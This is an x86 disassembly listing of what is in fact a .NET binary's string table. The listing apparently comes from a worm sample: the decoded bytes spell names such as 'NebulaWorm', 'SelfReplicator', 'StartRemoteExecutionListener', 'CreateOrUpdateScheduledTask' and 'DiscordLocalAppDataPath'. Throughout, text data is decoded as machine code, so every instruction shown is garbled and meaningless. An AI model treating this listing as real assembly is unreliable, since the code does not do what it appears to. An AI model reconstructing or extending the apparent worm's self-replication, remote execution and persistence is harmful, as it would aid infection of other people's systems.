  4064b5:	44                   	inc    %esp
  4064b6:	69 73 63 6f 72 64 4c 	imul   $0x4c64726f,0x63(%ebx),%esi
  4064bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4064be:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4064c1:	41                   	inc    %ecx
  4064c2:	70 70                	jo     0x406534
  4064c4:	44                   	inc    %esp
  4064c5:	61                   	popa
  4064c6:	74 61                	je     0x406529
  4064c8:	50                   	push   %eax
  4064c9:	61                   	popa
  4064ca:	74 68                	je     0x406534
  4064cc:	00 73 6f             	add    %dh,0x6f(%ebx)
  4064cf:	75 72                	jne    0x406543
  4064d1:	63 65 50             	arpl   %esp,0x50(%ebp)
  4064d4:	61                   	popa
  4064d5:	74 68                	je     0x40653f
  4064d7:	00 72 65             	add    %dh,0x65(%edx)
  4064da:	6d                   	insl   (%dx),%es:(%edi)
  4064db:	6f                   	outsl  %ds:(%esi),(%dx)
  4064dc:	74 65                	je     0x406543
  4064de:	46                   	inc    %esi
  4064df:	69 6c 65 50 61 74 68 	imul   $0x687461,0x50(%ebp,%eiz,2),%ebp
  4064e6:	00 
  4064e7:	65 78 65             	gs js  0x40654f
  4064ea:	50                   	push   %eax
  4064eb:	61                   	popa
  4064ec:	74 68                	je     0x406556
  4064ee:	00 6c 6e 6b          	add    %ch,0x6b(%esi,%ebp,2)
  4064f2:	50                   	push   %eax
  4064f3:	61                   	popa
  4064f4:	74 68                	je     0x40655e
  4064f6:	00 47 65             	add    %al,0x65(%edi)
  4064f9:	74 46                	je     0x406541
  4064fb:	75 6c                	jne    0x406569
  4064fd:	6c                   	insb   (%dx),%es:(%edi)
  4064fe:	50                   	push   %eax
  4064ff:	61                   	popa
  406500:	74 68                	je     0x40656a
  406502:	00 47 65             	add    %al,0x65(%edi)
  406505:	74 54                	je     0x40655b
  406507:	65 6d                	gs insl (%dx),%es:(%edi)
  406509:	70 50                	jo     0x40655b
  40650b:	61                   	popa
  40650c:	74 68                	je     0x406576
  40650e:	00 47 65             	add    %al,0x65(%edi)
  406511:	74 46                	je     0x406559
  406513:	6f                   	outsl  %ds:(%esi),(%dx)
  406514:	6c                   	insb   (%dx),%es:(%edi)
  406515:	64 65 72 50          	fs gs jb 0x406569
  406519:	61                   	popa
  40651a:	74 68                	je     0x406584
  40651c:	00 66 6f             	add    %ah,0x6f(%esi)
  40651f:	6c                   	insb   (%dx),%es:(%edi)
  406520:	64 65 72 50          	fs gs jb 0x406574
  406524:	61                   	popa
  406525:	74 68                	je     0x40658f
  406527:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  40652b:	67 65 74 50          	addr16 gs je 0x40657f
  40652f:	61                   	popa
  406530:	74 68                	je     0x40659a
  406532:	00 4d 61             	add    %cl,0x61(%ebp)
  406535:	6e                   	outsb  %ds:(%esi),(%dx)
  406536:	61                   	popa
  406537:	67 65 6d             	gs insl (%dx),%es:(%di)
  40653a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40653c:	74 50                	je     0x40658e
  40653e:	61                   	popa
  40653f:	74 68                	je     0x4065a9
  406541:	00 63 75             	add    %ah,0x75(%ebx)
  406544:	72 72                	jb     0x4065b8
  406546:	65 6e                	outsb  %gs:(%esi),(%dx)
  406548:	74 50                	je     0x40659a
  40654a:	61                   	popa
  40654b:	74 68                	je     0x4065b5
  40654d:	00 67 65             	add    %ah,0x65(%edi)
  406550:	74 5f                	je     0x4065b1
  406552:	4c                   	dec    %esp
  406553:	65 6e                	outsb  %gs:(%esi),(%dx)
  406555:	67 74 68             	addr16 je 0x4065c0
  406558:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  40655c:	67 74 68             	addr16 je 0x4065c7
  40655f:	00 53 6c             	add    %dl,0x6c(%ebx)
  406562:	6f                   	outsl  %ds:(%esi),(%dx)
  406563:	77 57                	ja     0x4065bc
  406565:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  40656b:	54                   	push   %esp
  40656c:	61                   	popa
  40656d:	73 6b                	jae    0x4065da
  40656f:	00 43 72             	add    %al,0x72(%ebx)
  406572:	65 61                	gs popa
  406574:	74 65                	je     0x4065db
  406576:	4f                   	dec    %edi
  406577:	72 55                	jb     0x4065ce
  406579:	70 64                	jo     0x4065df
  40657b:	61                   	popa
  40657c:	74 65                	je     0x4065e3
  40657e:	53                   	push   %ebx
  40657f:	63 68 65             	arpl   %ebp,0x65(%eax)
  406582:	64 75 6c             	fs jne 0x4065f1
  406585:	65 64 54             	gs fs push %esp
  406588:	61                   	popa
  406589:	73 6b                	jae    0x4065f6
  40658b:	00 53 79             	add    %dl,0x79(%ebx)
  40658e:	73 74                	jae    0x406604
  406590:	65 6d                	gs insl (%dx),%es:(%edi)
  406592:	2e 53                	cs push %ebx
  406594:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406598:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40659f:	6e 
  4065a0:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065a3:	61                   	popa
  4065a4:	6c                   	insb   (%dx),%es:(%edi)
  4065a5:	00 57 69             	add    %dl,0x69(%edi)
  4065a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4065a9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4065ab:	77 73                	ja     0x406620
  4065ad:	50                   	push   %eax
  4065ae:	72 69                	jb     0x406619
  4065b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b1:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065b4:	61                   	popa
  4065b5:	6c                   	insb   (%dx),%es:(%edi)
  4065b6:	00 50 61             	add    %dl,0x61(%eax)
  4065b9:	74 68                	je     0x406623
  4065bb:	73 45                	jae    0x406602
  4065bd:	71 75                	jno    0x406634
  4065bf:	61                   	popa
  4065c0:	6c                   	insb   (%dx),%es:(%edi)
  4065c1:	00 43 61             	add    %al,0x61(%ebx)
  4065c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4065c5:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  4065c8:	00 41 75             	add    %al,0x75(%ecx)
  4065cb:	74 68                	je     0x406635
  4065cd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4065cf:	74 69                	je     0x40663a
  4065d1:	63 61 74             	arpl   %esp,0x74(%ecx)
  4065d4:	69 6f 6e 4c 65 76 65 	imul   $0x6576654c,0x6e(%edi),%ebp
  4065db:	6c                   	insb   (%dx),%es:(%edi)
  4065dc:	00 49 6d             	add    %cl,0x6d(%ecx)
  4065df:	70 65                	jo     0x406646
  4065e1:	72 73                	jb     0x406656
  4065e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4065e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4065e5:	61                   	popa
  4065e6:	74 69                	je     0x406651
  4065e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4065e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ea:	4c                   	dec    %esp
  4065eb:	65 76 65             	gs jbe 0x406653
  4065ee:	6c                   	insb   (%dx),%es:(%edi)
  4065ef:	00 57 68             	add    %dl,0x68(%edi)
  4065f2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4065f4:	41                   	inc    %ecx
  4065f5:	6c                   	insb   (%dx),%es:(%edi)
  4065f6:	6c                   	insb   (%dx),%es:(%edi)
  4065f7:	00 4e 65             	add    %cl,0x65(%esi)
  4065fa:	74 77                	je     0x406673
  4065fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4065fd:	72 6b                	jb     0x40666a
  4065ff:	53                   	push   %ebx
  406600:	74 72                	je     0x406674
  406602:	65 61                	gs popa
  406604:	6d                   	insl   (%dx),%es:(%edi)
  406605:	00 47 65             	add    %al,0x65(%edi)
  406608:	74 53                	je     0x40665d
  40660a:	74 72                	je     0x40667e
  40660c:	65 61                	gs popa
  40660e:	6d                   	insl   (%dx),%es:(%edi)
  40660f:	00 50 72             	add    %dl,0x72(%eax)
  406612:	6f                   	outsl  %ds:(%esi),(%dx)
  406613:	67 72 61             	addr16 jb 0x406677
  406616:	6d                   	insl   (%dx),%es:(%edi)
  406617:	00 67 65             	add    %ah,0x65(%edi)
  40661a:	74 5f                	je     0x40667b
  40661c:	49                   	dec    %ecx
  40661d:	74 65                	je     0x406684
  40661f:	6d                   	insl   (%dx),%es:(%edi)
  406620:	00 73 65             	add    %dh,0x65(%ebx)
  406623:	74 5f                	je     0x406684
  406625:	49                   	dec    %ecx
  406626:	74 65                	je     0x40668d
  406628:	6d                   	insl   (%dx),%es:(%edi)
  406629:	00 53 79             	add    %dl,0x79(%ebx)
  40662c:	73 74                	jae    0x4066a2
  40662e:	65 6d                	gs insl (%dx),%es:(%edi)
  406630:	00 53 65             	add    %dl,0x65(%ebx)
  406633:	6d                   	insl   (%dx),%es:(%edi)
  406634:	61                   	popa
  406635:	70 68                	jo     0x40669f
  406637:	6f                   	outsl  %ds:(%esi),(%dx)
  406638:	72 65                	jb     0x40669f
  40663a:	53                   	push   %ebx
  40663b:	6c                   	insb   (%dx),%es:(%edi)
  40663c:	69 6d 00 52 61 6e 64 	imul   $0x646e6152,0x0(%ebp),%ebp
  406643:	6f                   	outsl  %ds:(%esi),(%dx)
  406644:	6d                   	insl   (%dx),%es:(%edi)
  406645:	00 4e 65             	add    %cl,0x65(%esi)
  406648:	62 75 6c             	bound  %esi,0x6c(%ebp)
  40664b:	61                   	popa
  40664c:	57                   	push   %edi
  40664d:	6f                   	outsl  %ds:(%esi),(%dx)
  40664e:	72 6d                	jb     0x4066bd
  406650:	00 6f 70             	add    %ch,0x70(%edi)
  406653:	5f                   	pop    %edi
  406654:	4c                   	dec    %esp
  406655:	65 73 73             	gs jae 0x4066cb
  406658:	54                   	push   %esp
  406659:	68 61 6e 00 54       	push   $0x54006e61
  40665e:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  406665:	00 67 65             	add    %ah,0x65(%edi)
  406668:	74 5f                	je     0x4066c9
  40666a:	54                   	push   %esp
  40666b:	6f                   	outsl  %ds:(%esi),(%dx)
  40666c:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  406670:	43                   	inc    %ebx
  406671:	61                   	popa
  406672:	6e                   	outsb  %ds:(%esi),(%dx)
  406673:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  406676:	6c                   	insb   (%dx),%es:(%edi)
  406677:	61                   	popa
  406678:	74 69                	je     0x4066e3
  40667a:	6f                   	outsl  %ds:(%esi),(%dx)
  40667b:	6e                   	outsb  %ds:(%esi),(%dx)
  40667c:	54                   	push   %esp
  40667d:	6f                   	outsl  %ds:(%esi),(%dx)
  40667e:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  406682:	4d                   	dec    %ebp
  406683:	61                   	popa
  406684:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  40668b:	41                   	inc    %ecx
  40668c:	75 74                	jne    0x406702
  40668e:	68 65 6e 74 69       	push   $0x69746e65
  406693:	63 61 74             	arpl   %esp,0x74(%ecx)
  406696:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40669d:	74 65                	je     0x406704
  40669f:	6d                   	insl   (%dx),%es:(%edi)
  4066a0:	2e 4e                	cs dec %esi
  4066a2:	65 74 2e             	gs je  0x4066d3
  4066a5:	4e                   	dec    %esi
  4066a6:	65 74 77             	gs je  0x406720
  4066a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4066aa:	72 6b                	jb     0x406717
  4066ac:	49                   	dec    %ecx
  4066ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4066ae:	66 6f                	outsw  %ds:(%esi),(%dx)
  4066b0:	72 6d                	jb     0x40671f
  4066b2:	61                   	popa
  4066b3:	74 69                	je     0x40671e
  4066b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4066b7:	00 73 65             	add    %dh,0x65(%ebx)
  4066ba:	74 5f                	je     0x40671b
  4066bc:	49                   	dec    %ecx
  4066bd:	6d                   	insl   (%dx),%es:(%edi)
  4066be:	70 65                	jo     0x406725
  4066c0:	72 73                	jb     0x406735
  4066c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4066c4:	61                   	popa
  4066c5:	74 69                	je     0x406730
  4066c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4066c9:	00 53 65             	add    %dl,0x65(%ebx)
  4066cc:	63 75 72             	arpl   %esi,0x72(%ebp)
  4066cf:	69 74 79 41 63 74 69 	imul   $0x6f697463,0x41(%ecx,%edi,2),%esi
  4066d6:	6f 
  4066d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4066d8:	00 53 79             	add    %dl,0x79(%ebx)
  4066db:	73 74                	jae    0x406751
  4066dd:	65 6d                	gs insl (%dx),%es:(%edi)
  4066df:	2e 52                	cs push %edx
  4066e1:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4066e4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4066e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4066ea:	00 50 72             	add    %dl,0x72(%eax)
  4066ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ee:	70 65                	jo     0x406755
  4066f0:	72 74                	jb     0x406766
  4066f2:	79 44                	jns    0x406738
  4066f4:	61                   	popa
  4066f5:	74 61                	je     0x406758
  4066f7:	43                   	inc    %ebx
  4066f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f9:	6c                   	insb   (%dx),%es:(%edi)
  4066fa:	6c                   	insb   (%dx),%es:(%edi)
  4066fb:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406700:	6e                   	outsb  %ds:(%esi),(%dx)
  406701:	00 4d 61             	add    %cl,0x61(%ebp)
  406704:	6e                   	outsb  %ds:(%esi),(%dx)
  406705:	61                   	popa
  406706:	67 65 6d             	gs insl (%dx),%es:(%di)
  406709:	65 6e                	outsb  %gs:(%esi),(%dx)
  40670b:	74 4f                	je     0x40675c
  40670d:	62 6a 65             	bound  %ebp,0x65(%edx)
  406710:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406714:	6c                   	insb   (%dx),%es:(%edi)
  406715:	6c                   	insb   (%dx),%es:(%edi)
  406716:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40671b:	6e                   	outsb  %ds:(%esi),(%dx)
  40671c:	00 49 4f             	add    %cl,0x4f(%ecx)
  40671f:	45                   	inc    %ebp
  406720:	78 63                	js     0x406785
  406722:	65 70 74             	gs jo  0x406799
  406725:	69 6f 6e 00 54 61 73 	imul   $0x73615400,0x6e(%edi),%ebp
  40672c:	6b 43 61 6e          	imul   $0x6e,0x61(%ebx),%eax
  406730:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  406733:	65 64 45             	gs fs inc %ebp
  406736:	78 63                	js     0x40679b
  406738:	65 70 74             	gs jo  0x4067af
  40673b:	69 6f 6e 00 55 6e 61 	imul   $0x616e5500,0x6e(%edi),%ebp
  406742:	75 74                	jne    0x4067b8
  406744:	68 6f 72 69 7a       	push   $0x7a69726f
  406749:	65 64 41             	gs fs inc %ecx
  40674c:	63 63 65             	arpl   %esp,0x65(%ebx)
  40674f:	73 73                	jae    0x4067c4
  406751:	45                   	inc    %ebp
  406752:	78 63                	js     0x4067b7
  406754:	65 70 74             	gs jo  0x4067cb
  406757:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  40675e:	45                   	inc    %ebp
  40675f:	78 63                	js     0x4067c4
  406761:	65 70 74             	gs jo  0x4067d8
  406764:	69 6f 6e 00 53 74 72 	imul   $0x72745300,0x6e(%edi),%ebp
  40676b:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  406772:	61                   	popa
  406773:	72 69                	jb     0x4067de
  406775:	73 6f                	jae    0x4067e6
  406777:	6e                   	outsb  %ds:(%esi),(%dx)
  406778:	00 52 75             	add    %dl,0x75(%edx)
  40677b:	6e                   	outsb  %ds:(%esi),(%dx)
  40677c:	00 46 69             	add    %al,0x69(%esi)
  40677f:	6c                   	insb   (%dx),%es:(%edi)
  406780:	65 49                	gs dec %ecx
  406782:	6e                   	outsb  %ds:(%esi),(%dx)
  406783:	66 6f                	outsw  %ds:(%esi),(%dx)
  406785:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  406789:	76 65                	jbe    0x4067f0
  40678b:	49                   	dec    %ecx
  40678c:	6e                   	outsb  %ds:(%esi),(%dx)
  40678d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40678f:	00 45 78             	add    %al,0x78(%ebp)
  406792:	63 65 70             	arpl   %esp,0x70(%ebp)
  406795:	74 69                	je     0x406800
  406797:	6f                   	outsl  %ds:(%esi),(%dx)
  406798:	6e                   	outsb  %ds:(%esi),(%dx)
  406799:	44                   	inc    %esp
  40679a:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
  4067a1:	49                   	dec    %ecx
  4067a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4067a3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067a5:	00 46 69             	add    %al,0x69(%esi)
  4067a8:	6c                   	insb   (%dx),%es:(%edi)
  4067a9:	65 53                	gs push %ebx
  4067ab:	79 73                	jns    0x406820
  4067ad:	74 65                	je     0x406814
  4067af:	6d                   	insl   (%dx),%es:(%edi)
  4067b0:	49                   	dec    %ecx
  4067b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067b4:	00 50 72             	add    %dl,0x72(%eax)
  4067b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4067b8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4067bb:	73 53                	jae    0x406810
  4067bd:	74 61                	je     0x406820
  4067bf:	72 74                	jb     0x406835
  4067c1:	49                   	dec    %ecx
  4067c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4067c3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067c5:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  4067c9:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4067ce:	79 49                	jns    0x406819
  4067d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4067d1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067d3:	00 53 6c             	add    %dl,0x6c(%ebx)
  4067d6:	65 65 70 00          	gs gs jo 0x4067da
  4067da:	69 70 00 53 74 6f 70 	imul   $0x706f7453,0x0(%eax),%esi
  4067e1:	00 53 79             	add    %dl,0x79(%ebx)
  4067e4:	73 74                	jae    0x40685a
  4067e6:	65 6d                	gs insl (%dx),%es:(%edi)
  4067e8:	2e 4c                	cs dec %esp
  4067ea:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  4067f1:	72 00                	jb     0x4067f3
  4067f3:	53                   	push   %ebx
  4067f4:	74 72                	je     0x406868
  4067f6:	65 61                	gs popa
  4067f8:	6d                   	insl   (%dx),%es:(%edi)
  4067f9:	52                   	push   %edx
  4067fa:	65 61                	gs popa
  4067fc:	64 65 72 00          	fs gs jb 0x406800
  406800:	54                   	push   %esp
  406801:	65 78 74             	gs js  0x406878
  406804:	52                   	push   %edx
  406805:	65 61                	gs popa
  406807:	64 65 72 00          	fs gs jb 0x40680b
  40680b:	41                   	inc    %ecx
  40680c:	73 79                	jae    0x406887
  40680e:	6e                   	outsb  %ds:(%esi),(%dx)
  40680f:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  406813:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  406817:	68 6f 64 42 75       	push   $0x7542646f
  40681c:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  406823:	3e 
  406824:	74 5f                	je     0x406885
  406826:	5f                   	pop    %edi
  406827:	62 75 69             	bound  %esi,0x69(%ebp)
  40682a:	6c                   	insb   (%dx),%es:(%edi)
  40682b:	64 65 72 00          	fs gs jb 0x40682f
  40682f:	53                   	push   %ebx
  406830:	70 65                	jo     0x406897
  406832:	63 69 61             	arpl   %ebp,0x61(%ecx)
  406835:	6c                   	insb   (%dx),%es:(%edi)
  406836:	46                   	inc    %esi
  406837:	6f                   	outsl  %ds:(%esi),(%dx)
  406838:	6c                   	insb   (%dx),%es:(%edi)
  406839:	64 65 72 00          	fs gs jb 0x40683d
  40683d:	44                   	inc    %esp
  40683e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406842:	67 65 72 00          	addr16 gs jb 0x406846
  406846:	4d                   	dec    %ebp
  406847:	61                   	popa
  406848:	6e                   	outsb  %ds:(%esi),(%dx)
  406849:	61                   	popa
  40684a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40684d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40684f:	74 4f                	je     0x4068a0
  406851:	62 6a 65             	bound  %ebp,0x65(%edx)
  406854:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  406858:	61                   	popa
  406859:	72 63                	jb     0x4068be
  40685b:	68 65 72 00 74       	push   $0x74007265
  406860:	68 72 6f 74 74       	push   $0x74746f72
  406865:	6c                   	insb   (%dx),%es:(%edi)
  406866:	65 72 00             	gs jb  0x406869
  406869:	53                   	push   %ebx
  40686a:	74 61                	je     0x4068cd
  40686c:	72 74                	jb     0x4068e2
  40686e:	52                   	push   %edx
  40686f:	65 6d                	gs insl (%dx),%es:(%edi)
  406871:	6f                   	outsl  %ds:(%esi),(%dx)
  406872:	74 65                	je     0x4068d9
  406874:	45                   	inc    %ebp
  406875:	78 65                	js     0x4068dc
  406877:	63 75 74             	arpl   %esi,0x74(%ebp)
  40687a:	69 6f 6e 4c 69 73 74 	imul   $0x7473694c,0x6e(%edi),%ebp
  406881:	65 6e                	outsb  %gs:(%esi),(%dx)
  406883:	65 72 00             	gs jb  0x406886
  406886:	54                   	push   %esp
  406887:	63 70 4c             	arpl   %esi,0x4c(%eax)
  40688a:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  406891:	00 43 75             	add    %al,0x75(%ebx)
  406894:	72 72                	jb     0x406908
  406896:	65 6e                	outsb  %gs:(%esi),(%dx)
  406898:	74 55                	je     0x4068ef
  40689a:	73 65                	jae    0x406901
  40689c:	72 00                	jb     0x40689e
  40689e:	54                   	push   %esp
  40689f:	61                   	popa
  4068a0:	73 6b                	jae    0x40690d
  4068a2:	41                   	inc    %ecx
  4068a3:	77 61                	ja     0x406906
  4068a5:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  4068ac:	74 
  4068ad:	41                   	inc    %ecx
  4068ae:	77 61                	ja     0x406911
  4068b0:	69 74 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esi
  4068b7:	72 
  4068b8:	65 61                	gs popa
  4068ba:	6d                   	insl   (%dx),%es:(%edi)
  4068bb:	57                   	push   %edi
  4068bc:	72 69                	jb     0x406927
  4068be:	74 65                	je     0x406925
  4068c0:	72 00                	jb     0x4068c2
  4068c2:	54                   	push   %esp
  4068c3:	65 78 74             	gs js  0x40693a
  4068c6:	57                   	push   %edi
  4068c7:	72 69                	jb     0x406932
  4068c9:	74 65                	je     0x406930
  4068cb:	72 00                	jb     0x4068cd
  4068cd:	45                   	inc    %ebp
  4068ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4068cf:	74 65                	je     0x406936
  4068d1:	72 00                	jb     0x4068d3
  4068d3:	54                   	push   %esp
  4068d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4068d5:	4c                   	dec    %esp
  4068d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4068d7:	77 65                	ja     0x40693e
  4068d9:	72 00                	jb     0x4068db
  4068db:	77 6f                	ja     0x40694c
  4068dd:	72 6b                	jb     0x40694a
  4068df:	69 6e 67 44 69 72 00 	imul   $0x726944,0x67(%esi),%ebp
  4068e6:	73 65                	jae    0x40694d
  4068e8:	74 5f                	je     0x406949
  4068ea:	46                   	inc    %esi
  4068eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4068ec:	72 65                	jb     0x406953
  4068ee:	67 72 6f             	addr16 jb 0x406960
  4068f1:	75 6e                	jne    0x406961
  4068f3:	64 43                	fs inc %ebx
  4068f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4068f6:	6c                   	insb   (%dx),%es:(%edi)
  4068f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4068f8:	72 00                	jb     0x4068fa
  4068fa:	43                   	inc    %ebx
  4068fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4068fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4068fd:	73 6f                	jae    0x40696e
  4068ff:	6c                   	insb   (%dx),%es:(%edi)
  406900:	65 43                	gs inc %ebx
  406902:	6f                   	outsl  %ds:(%esi),(%dx)
  406903:	6c                   	insb   (%dx),%es:(%edi)
  406904:	6f                   	outsl  %ds:(%esi),(%dx)
  406905:	72 00                	jb     0x406907
  406907:	52                   	push   %edx
  406908:	65 73 65             	gs jae 0x406970
  40690b:	74 43                	je     0x406950
  40690d:	6f                   	outsl  %ds:(%esi),(%dx)
  40690e:	6c                   	insb   (%dx),%es:(%edi)
  40690f:	6f                   	outsl  %ds:(%esi),(%dx)
  406910:	72 00                	jb     0x406912
  406912:	67 65 74 5f          	addr16 gs je 0x406975
  406916:	53                   	push   %ebx
  406917:	74 61                	je     0x40697a
  406919:	6e                   	outsb  %ds:(%esi),(%dx)
  40691a:	64 61                	fs popa
  40691c:	72 64                	jb     0x406982
  40691e:	45                   	inc    %ebp
  40691f:	72 72                	jb     0x406993
  406921:	6f                   	outsl  %ds:(%esi),(%dx)
  406922:	72 00                	jb     0x406924
  406924:	73 65                	jae    0x40698b
  406926:	74 5f                	je     0x406987
  406928:	52                   	push   %edx
  406929:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  406930:	53 74 
  406932:	61                   	popa
  406933:	6e                   	outsb  %ds:(%esi),(%dx)
  406934:	64 61                	fs popa
  406936:	72 64                	jb     0x40699c
  406938:	45                   	inc    %ebp
  406939:	72 72                	jb     0x4069ad
  40693b:	6f                   	outsl  %ds:(%esi),(%dx)
  40693c:	72 00                	jb     0x40693e
  40693e:	53                   	push   %ebx
  40693f:	65 6c                	gs insb (%dx),%es:(%edi)
  406941:	66 52                	push   %dx
  406943:	65 70 6c             	gs jo  0x4069b2
  406946:	69 63 61 74 6f 72 00 	imul   $0x726f74,0x61(%ebx),%esp
  40694d:	4d                   	dec    %ebp
  40694e:	61                   	popa
  40694f:	6e                   	outsb  %ds:(%esi),(%dx)
  406950:	61                   	popa
  406951:	67 65 6d             	gs insl (%dx),%es:(%di)
  406954:	65 6e                	outsb  %gs:(%esi),(%dx)
  406956:	74 4f                	je     0x4069a7
  406958:	62 6a 65             	bound  %ebp,0x65(%edx)
  40695b:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40695f:	75 6d                	jne    0x4069ce
  406961:	65 72 61             	gs jb  0x4069c5
  406964:	74 6f                	je     0x4069d5
  406966:	72 00                	jb     0x406968
  406968:	47                   	inc    %edi
  406969:	65 74 45             	gs je  0x4069b1
  40696c:	6e                   	outsb  %ds:(%esi),(%dx)
  40696d:	75 6d                	jne    0x4069dc
  40696f:	65 72 61             	gs jb  0x4069d3
  406972:	74 6f                	je     0x4069e3
  406974:	72 00                	jb     0x406976
  406976:	49                   	dec    %ecx
  406977:	73 41                	jae    0x4069ba
  406979:	64 6d                	fs insl (%dx),%es:(%edi)
  40697b:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  406982:	74 6f                	je     0x4069f3
  406984:	72 00                	jb     0x406986
  406986:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40698b:	00 2e                	add    %ch,(%esi)
  40698d:	63 63 74             	arpl   %esp,0x74(%ebx)
  406990:	6f                   	outsl  %ds:(%esi),(%dx)
  406991:	72 00                	jb     0x406993
  406993:	4d                   	dec    %ebp
  406994:	6f                   	outsl  %ds:(%esi),(%dx)
  406995:	6e                   	outsb  %ds:(%esi),(%dx)
  406996:	69 74 6f 72 00 53 79 	imul   $0x73795300,0x72(%edi,%ebp,2),%esi
  40699d:	73 
  40699e:	74 65                	je     0x406a05
  4069a0:	6d                   	insl   (%dx),%es:(%edi)
  4069a1:	2e 44                	cs inc %esp
  4069a3:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4069aa:	69 63 73 00 46 72 6f 	imul   $0x6f724600,0x73(%ebx),%esp
  4069b1:	6d                   	insl   (%dx),%es:(%edi)
  4069b2:	53                   	push   %ebx
  4069b3:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  4069b7:	64 73 00             	fs jae 0x4069ba
  4069ba:	41                   	inc    %ecx
  4069bb:	64 64 4d             	fs fs dec %ebp
  4069be:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  4069c5:	6f 
  4069c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4069c7:	64 73 00             	fs jae 0x4069ca
  4069ca:	67 65 74 5f          	addr16 gs je 0x406a2d
  4069ce:	45                   	inc    %ebp
